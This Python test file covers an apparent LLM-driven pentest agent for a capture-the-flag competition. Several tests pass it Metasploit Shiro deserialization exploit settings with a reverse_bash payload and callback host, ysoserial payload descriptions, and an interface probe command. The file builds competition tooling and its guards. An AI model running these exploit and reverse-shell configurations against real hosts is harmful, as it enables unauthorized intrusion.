"""Agent integration tests"""

import json
from pathlib import Path
import pytest
from agent.core import PentestAgent
from agent.memory import MemoryManager
from agent.planner import TaskPlanner
from competition.models import Challenge, ChallengeZone, ChallengeStatus


class TestMemoryManager:
    def test_basic_operations(self):
        memory = MemoryManager()
        memory.set_challenge("test_001", "192.168.1.1")
        assert memory.challenge_id == "test_001"
        assert memory.target == "192.168.1.1"

    def test_ports_and_services(self):
        memory = MemoryManager()
        memory.add_port("192.168.1.1", 80)
        memory.add_port("192.168.1.1", 443)
        memory.add_service("192.168.1.1", 80, "http Apache/2.4.49")
        assert 80 in memory.open_ports["192.168.1.1"]
        assert 443 in memory.open_ports["192.168.1.1"]
        assert memory.services["192.168.1.1"][80] == "http Apache/2.4.49"

    def test_credentials(self):
        memory = MemoryManager()
        memory.add_credential("admin", "pass123", "ssh")
        memory.add_credential("admin", "pass123", "ssh")
        assert len(memory.credentials) == 1

    def test_flags(self):
        memory = MemoryManager()
        memory.add_flag("flag{test_123}")
        memory.add_flag("flag{test_456}")
        memory.add_flag("flag{test_123}")
        assert len(memory.found_flags) == 2

    def test_conversation(self):
        memory = MemoryManager()
        memory.add_system_message("You are an agent")
        memory.add_user_message("Start")
        memory.add_assistant_message("OK")
        messages = memory.get_messages()
        assert len(messages) == 3
        assert messages[0]["role"] == "system"

    def test_reset(self):
        memory = MemoryManager()
        memory.add_flag("flag{test}")
        memory.add_port("192.168.1.1", 80)
        memory.mark_pattern_failure("exploit:demo@exploit")
        memory.reset()
        assert len(memory.found_flags) == 0
        assert len(memory.open_ports) == 0
        assert memory.last_failed_pattern == ""
        assert memory.last_failed_pattern_streak == 0

    def test_export_and_import_target_intelligence(self):
        memory = MemoryManager()
        memory.set_challenge("c1", "192.168.1.1")
        memory.add_port("192.168.1.1", 80)
        memory.add_service("192.168.1.1", 80, "http Apache")
        memory.add_credential("admin", "admin", "http")
        memory.add_finding("vulnerability", "server", "Apache")
        memory.record_action("curl({\"url\":\"http://192.168.1.1\"})")

        exported = memory.export_target_intelligence()

        restored = MemoryManager()
        restored.import_target_intelligence(exported)
        assert 80 in restored.open_ports["192.168.1.1"]
        assert restored.services["192.168.1.1"][80] == "http Apache"
        assert len(restored.credentials) == 1
        assert len(restored.findings) == 1
        assert len(restored.tried_actions) == 1

    def test_low_priority_pattern_after_consecutive_failures(self):
        memory = MemoryManager(pattern_failure_threshold=3)
        stage_key = "exploit:shiro_deserialization@exploit"
        assert not memory.mark_pattern_failure(stage_key)
        assert not memory.mark_pattern_failure(stage_key)
        assert memory.mark_pattern_failure(stage_key)
        assert memory.is_low_priority_pattern(stage_key)


class TestTaskPlanner:
    def _make(self, id, zone, score=100):
        return Challenge(id=id, name=f"C-{id}", zone=zone, base_score=score, status=ChallengeStatus.AVAILABLE)

    def test_zone_priority(self):
        planner = TaskPlanner()
        challenges = [self._make("z2", ChallengeZone.ZONE_2, 200), self._make("z1", ChallengeZone.ZONE_1, 100)]
        assert planner.select_next_challenge(challenges).id == "z1"

    def test_skip_solved(self):
        planner = TaskPlanner()
        planner.mark_solved("z1")
        challenges = [self._make("z1", ChallengeZone.ZONE_1), self._make("z2", ChallengeZone.ZONE_1)]
        assert planner.select_next_challenge(challenges).id == "z2"

    def test_skip_after_failures(self):
        planner = TaskPlanner()
        for _ in range(3):
            planner.mark_failed("z1")
        assert planner.should_skip_challenge("z1")

    def test_no_available(self):
        planner = TaskPlanner()
        planner.mark_solved("z1")
        assert planner.select_next_challenge([self._make("z1", ChallengeZone.ZONE_1)]) is None


class DummyLLM:
    def chat(self, messages):
        return "{}"

    def get_usage_stats(self):
        return {}


class DummyPlatform:
    def submit_flag(self, challenge_id, flag):
        raise NotImplementedError

    def get_hint(self, challenge_id):
        return None


class TestPentestAgentRecovery:
    def _make_agent(self, config=None):
        merged = {"agent": {"max_steps_per_challenge": 5}}
        if config:
            merged["agent"].update(config.get("agent", {}))
        return PentestAgent(
            llm_client=DummyLLM(),
            platform_client=DummyPlatform(),
            planner=TaskPlanner(),
            config=merged,
        )

    def test_parse_invalid_response_returns_empty_action(self):
        agent = self._make_agent()
        parsed = agent._parse_llm_response("not json at all")
        assert parsed["action"] == ""
        assert parsed["action_input"] == {}

    def test_choose_recovery_action_prefers_web_recon_for_http_like_target(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="10.0.0.1", target_port=23333)
        action, action_input, reason = agent._choose_recovery_action(challenge, no_progress=0)
        assert action == "skill"
        assert action_input == {"name": "web_recon", "url": "http://10.0.0.1:23333"}
        assert "web" in reason.lower()

    def test_normalize_action_input_corrects_mismatched_url_host(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        normalized = agent._normalize_action_input(
            challenge,
            "skill",
            {"name": "web_recon", "url": "http://42.193.80:23333/login.jsp"},
        )
        assert normalized["url"] == "http://42.193.9.80:23333/login.jsp"

    def test_normalize_action_input_injects_known_target_port_for_full_recon(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        normalized = agent._normalize_action_input(
            challenge,
            "skill",
            {"name": "full_recon", "target": "42.193.9.80"},
        )
        assert normalized["port"] == 23333

    def test_public_target_detection_distinguishes_cloud_ip_from_private_ip(self):
        agent = self._make_agent()
        assert agent._is_public_target(Challenge(id="c1", target_host="42.193.9.80", target_port=23333))
        assert not agent._is_public_target(Challenge(id="c2", target_host="192.168.1.10", target_port=8080))

    def test_guard_blocks_local_interface_probe_for_public_target(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        msg = agent._guard_target_specific_action(
            challenge,
            "shell",
            {"command": "ifconfig | grep -E 'inet (192\\.168|10\\.|172\\.)' | head -1"},
        )
        assert msg is not None
        assert "local private interfaces" in msg

    def test_guard_blocks_reverse_payload_without_callback_host_on_public_target(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        msg = agent._guard_target_specific_action(
            challenge,
            "exploit",
            {
                "action": "metasploit",
                "mode": "run",
                "module": "exploit/multi/http/shiro_rememberme_v124_deserialize",
                "payload": "cmd/unix/reverse_bash",
                "options": {"RHOSTS": "42.193.9.80", "LHOST": "172.31.41.30", "LPORT": 4444},
            },
        )
        assert msg is not None
        assert "public callback host" in msg

    def test_guard_allows_reverse_payload_when_callback_host_is_configured(self):
        agent = self._make_agent({"agent": {"callback_host": "203.0.113.10"}})
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        msg = agent._guard_target_specific_action(
            challenge,
            "exploit",
            {
                "action": "metasploit",
                "mode": "run",
                "module": "exploit/multi/http/shiro_rememberme_v124_deserialize",
                "payload": "cmd/unix/reverse_bash",
                "options": {"RHOSTS": "42.193.9.80", "LHOST": "203.0.113.10", "LPORT": 4444},
            },
        )
        assert msg is None

    def test_system_prompt_mentions_known_target_port(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        prompt = agent._build_system_prompt(challenge)
        assert "23333" in prompt
        assert "Probe the provided port directly" in prompt

    def test_agent_reuses_target_intelligence_for_same_target(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        agent.memory.set_challenge(challenge.id, challenge.target_host)
        agent.memory.add_port(challenge.target_host, 23333)
        agent.memory.add_service(challenge.target_host, 23333, "http Apache-Coyote")
        agent.memory.record_action('curl({"url":"http://42.193.9.80:23333"})')
        agent._save_target_intelligence(challenge)

        agent.memory.reset()
        agent.memory.set_challenge("c2", challenge.target_host)
        loaded = agent._load_target_intelligence(challenge)

        assert loaded is not None
        assert 23333 in agent.memory.open_ports[challenge.target_host]
        assert challenge.target_host in agent.memory.services
        assert agent.memory.tried_actions

    def test_agent_persists_target_intelligence_across_instances(self, tmp_path: Path):
        store_path = tmp_path / "target_intelligence.json"
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)

        first_agent = self._make_agent({"agent": {"target_intelligence_path": str(store_path)}})
        first_agent.memory.set_challenge(challenge.id, challenge.target_host)
        first_agent.memory.add_port(challenge.target_host, 23333)
        first_agent.memory.add_service(challenge.target_host, 23333, "http Apache-Coyote")
        first_agent.memory.record_action('curl({"url":"http://42.193.9.80:23333"})')
        first_agent._save_target_intelligence(challenge)

        assert store_path.exists()

        second_agent = self._make_agent({"agent": {"target_intelligence_path": str(store_path)}})
        second_agent.memory.set_challenge("c2", challenge.target_host)
        loaded = second_agent._load_target_intelligence(challenge)

        assert loaded is not None
        assert 23333 in second_agent.memory.open_ports[challenge.target_host]
        assert second_agent.memory.services[challenge.target_host][23333] == "http Apache-Coyote"

    def test_classify_exploitation_pattern_groups_shiro_variants(self):
        agent = self._make_agent()
        pattern = agent._classify_exploitation_pattern(
            "codegen",
            {"description": "Generate ysoserial CommonsCollections1 rememberMe payload for Shiro"},
        )
        assert pattern == "exploit:shiro_deserialization"

    def test_import_restores_low_priority_patterns(self):
        memory = MemoryManager()
        memory.import_target_intelligence(
            {
                "low_priority_patterns": ["exploit:shiro_deserialization@exploit"],
                "failed_patterns": {"exploit:shiro_deserialization@exploit": 3},
            }
        )
        assert memory.is_low_priority_pattern("exploit:shiro_deserialization@exploit")

    def test_stage_specific_low_priority_does_not_block_other_shiro_stages(self):
        memory = MemoryManager()
        memory.import_target_intelligence(
            {
                "low_priority_patterns": ["exploit:shiro_deserialization@exploit"],
                "failed_patterns": {"exploit:shiro_deserialization@exploit": 3},
            }
        )
        assert memory.is_low_priority_pattern("exploit:shiro_deserialization@exploit")
        assert not memory.is_low_priority_pattern("exploit:shiro_deserialization@auth")

    def test_shiro_login_post_is_not_classified_as_exploit_pattern(self):
        agent = self._make_agent()
        action_input = {
            "url": "http://42.193.9.80:23333/login.jsp",
            "method": "POST",
            "data": "username=root&password=secret&rememberMe=on&submit=Login",
        }
        assert agent._classify_exploitation_pattern("curl", action_input) == ""
        assert agent._classify_attack_stage("curl", action_input) == "auth"
        risk = agent._assess_action_risk("curl", action_input)
        assert risk["skip_eligible"] == "false"

    def test_shiro_payload_generation_remains_skip_eligible(self):
        agent = self._make_agent()
        action_input = {
            "description": "Generate ysoserial CommonsCollections1 rememberMe payload for Shiro",
        }
        risk = agent._assess_action_risk("codegen", action_input)
        assert risk["family"] == "exploit:shiro_deserialization"
        assert risk["stage"] == "exploit"
        assert risk["skip_eligible"] == "true"

    def test_metasploit_search_for_shiro_is_framework_discovery_not_exploit_failure(self):
        agent = self._make_agent()
        action_input = {"action": "metasploit", "mode": "search", "query": "shiro"}
        assert agent._classify_exploitation_pattern("exploit", action_input) == "exploit:shiro_deserialization"
        risk = agent._assess_action_risk("exploit", action_input)
        assert risk["stage"] == "framework-discovery"
        assert risk["skip_eligible"] == "false"

    def test_metasploit_info_for_shiro_is_framework_discovery_not_exploit_failure(self):
        agent = self._make_agent()
        action_input = {
            "action": "metasploit",
            "mode": "info",
            "module": "exploit/multi/http/shiro_rememberme_v124_deserialize",
        }
        risk = agent._assess_action_risk("exploit", action_input)
        assert risk["stage"] == "framework-discovery"
        assert risk["skip_eligible"] == "false"

    def test_metasploit_check_for_shiro_is_validation_stage(self):
        agent = self._make_agent()
        action_input = {
            "action": "metasploit",
            "mode": "check",
            "module": "exploit/multi/http/shiro_rememberme_v124_deserialize",
        }
        risk = agent._assess_action_risk("exploit", action_input)
        assert risk["family"] == "exploit:shiro_deserialization"
        assert risk["stage"] == "validation"
        assert risk["skip_eligible"] == "true"

    def test_clear_target_intelligence_removes_persisted_entry(self, tmp_path: Path):
        store_path = tmp_path / "target_intelligence.json"
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        agent = self._make_agent({"agent": {"target_intelligence_path": str(store_path)}})
        agent.memory.set_challenge(challenge.id, challenge.target_host)
        agent.memory.add_port(challenge.target_host, 23333)
        agent._save_target_intelligence(challenge)

        assert agent.clear_target_intelligence(challenge) is True
        reloaded = json.loads(store_path.read_text(encoding="utf-8"))
        assert "42.193.9.80:23333" not in reloaded

    def test_hypothesis_engine_records_shiro_cve(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        agent.memory.set_challenge(challenge.id, challenge.target_host)
        agent._update_vulnerability_hypotheses(
            challenge,
            [
                "Apache Shiro Quickstart",
                "Set-Cookie: rememberMe=deleteMe",
                "login.jsp has a Remember Me checkbox",
            ],
        )
        assert any(
            finding.key == "hypothesis:shiro-cve_2016_4437"
            for finding in agent.memory.findings
        )

    def test_attack_milestones_record_shiro_progress(self):
        agent = self._make_agent()
        agent._update_attack_milestones(
            [
                "Apache Shiro Quickstart",
                "Set-Cookie: rememberMe=deleteMe",
                "You are currently logged in.",
            ]
        )
        assert "milestone:shiro:fingerprint" in agent.memory.attack_milestones
        assert "milestone:shiro:key-validation" in agent.memory.attack_milestones
        assert "milestone:shiro:auth" in agent.memory.attack_milestones

    def test_choose_hypothesis_action_routes_shiro_to_known_cve_playbook(self):
        agent = self._make_agent()
        agent.capabilities["exploit"]["commands"] = []
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        agent.memory.add_finding(
            "hypothesis",
            "hypothesis:shiro-cve_2016_4437",
            "Apache Shiro rememberMe default-key deserialization",
            source="vuln_hypotheses",
        )
        action, action_input, reason = agent._choose_hypothesis_action(challenge)
        assert action == "aboutsecurity"
        assert action_input == {"action": "show_skill", "name": "known-cve-quick-exploit"}
        assert "Shiro" in reason

    def test_choose_hypothesis_action_prefers_metasploit_when_available_for_known_cve(self):
        agent = self._make_agent()
        agent.capabilities["exploit"]["commands"] = ["msfconsole", "nc"]
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        agent.memory.add_finding(
            "hypothesis",
            "hypothesis:shiro-cve_2016_4437",
            "Apache Shiro rememberMe default-key deserialization",
            source="vuln_hypotheses",
        )
        action, action_input, reason = agent._choose_hypothesis_action(challenge)
        assert action == "exploit"
        assert action_input["action"] == "metasploit"
        assert action_input["mode"] == "search"
        assert "shiro" in action_input["query"]
        assert "Metasploit" in reason

    def test_choose_hypothesis_action_still_allows_metasploit_discovery_when_exploit_stage_is_low_priority(self):
        agent = self._make_agent()
        agent.capabilities["exploit"]["commands"] = ["msfconsole", "nc"]
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        agent.memory.add_finding(
            "hypothesis",
            "hypothesis:shiro-cve_2016_4437",
            "Apache Shiro rememberMe default-key deserialization",
            source="vuln_hypotheses",
        )
        agent.memory.low_priority_patterns.add("exploit:shiro_deserialization@exploit")

        action, action_input, reason = agent._choose_hypothesis_action(challenge)

        assert action == "exploit"
        assert action_input["action"] == "metasploit"
        assert action_input["mode"] == "search"
        assert "shiro" in action_input["query"]

    def test_choose_recovery_action_prefers_hypothesis_route_over_generic_probe(self):
        agent = self._make_agent()
        challenge = Challenge(id="c1", target_host="42.193.9.80", target_port=23333)
        agent.memory.add_finding(
            "hypothesis",
            "hypothesis:sql-injection",
            "SQL injection candidate",
            source="vuln_hypotheses",
        )
        action, action_input, reason = agent._choose_recovery_action(challenge, no_progress=0)
        assert action == "aboutsecurity"
        assert action_input["name"] == "sql-injection-methodology"

    def test_should_override_with_hypothesis_when_model_drifts(self):
        agent = self._make_agent()
        hypothesis_action = (
            "aboutsecurity",
            {"action": "show_skill", "name": "known-cve-quick-exploit"},
            "High-confidence Shiro CVE hypothesis detected",
        )
        assert agent._should_override_with_hypothesis(
            "curl",
            {"url": "http://42.193.9.80:23333/login.jsp"},
            hypothesis_action,
        )

    def test_should_not_override_when_action_already_matches_hypothesis(self):
        agent = self._make_agent()
        hypothesis_action = (
            "aboutsecurity",
            {"action": "show_skill", "name": "known-cve-quick-exploit"},
            "High-confidence Shiro CVE hypothesis detected",
        )
        assert not agent._should_override_with_hypothesis(
            "aboutsecurity",
            {"action": "show_skill", "name": "known-cve-quick-exploit"},
            hypothesis_action,
        )

    def test_parse_codegen_response_with_long_code_string(self):
        agent = self._make_agent()
        response = """```json
{
  "thought": "Run helper script",
  "action": "codegen",
  "action_input": {
    "language": "python",
    "description": "helper",
    "code": "import json\\nprint({\\"ok\\": true})\\nfor i in range(2):\\n    print(i)"
  }
}
```"""
        parsed = agent._parse_llm_response(response)
        assert parsed["action"] == "codegen"
        assert parsed["action_input"]["language"] == "python"
        assert "print" in parsed["action_input"]["code"]

    def test_salvage_codegen_response_with_raw_newlines_in_code(self):
        agent = self._make_agent()
        response = """
{
  "thought": "Run exploit helper",
  "action": "codegen",
  "action_input": {
    "language": "python",
    "description": "helper",
    "code": "import sys
print('hello')
for i in range(2):
    print(i)"
  }
}
"""
        parsed = agent._parse_llm_response(response)
        assert parsed["action"] == "codegen"
        assert parsed["action_input"]["language"] == "python"
        assert "print('hello')" in parsed["action_input"]["code"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
